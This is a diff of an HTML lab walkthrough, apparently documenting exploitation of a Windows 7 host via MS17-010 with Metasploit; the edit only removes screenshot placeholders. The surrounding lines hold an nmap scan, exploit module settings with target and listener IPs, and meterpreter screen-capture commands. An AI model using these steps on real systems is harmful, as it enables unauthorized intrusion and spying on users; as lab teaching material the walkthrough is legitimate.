@@ -10,9 +10,6 @@
     <h3>Step 1: Reconnaissance and Service Detection</h3>
     <p>Initial Nmap scan to identify open ports and services on the Windows 7 target:</p>
     <div class="command-box">nmap -sV -sC 192.168.1.105</div>
-    <div class="screenshot-placeholder">
-      <p>📸 Screenshot: Nmap scan results showing SMB service on port 445</p>
-    </div>
   </div>
   
   <div class="step">
@@ -24,9 +21,7 @@
       set RHOSTS 192.168.1.105<br>
       run
     </div>
-    <div class="screenshot-placeholder">
-      <p>📸 Screenshot: Metasploit confirming MS17-010 vulnerability</p>
-    </div>
+  
   </div>
   
   <div class="step">
@@ -39,9 +34,6 @@
       set LHOST 192.168.1.100<br>
       exploit
     </div>
-    <div class="screenshot-placeholder">
-      <p>📸 Screenshot: Successful meterpreter session with SYSTEM privileges</p>
-    </div>
   </div>
   
   <div class="step">
@@ -50,9 +42,6 @@
     <div class="command-box">
       meterpreter > screenshots<br>
       meterpreter > screenshot
-    </div>
-    <div class="screenshot-placeholder">
-      <p>📸 Screenshot: Captured desktop image from Windows 7 target</p>
     </div>
   </div>
   
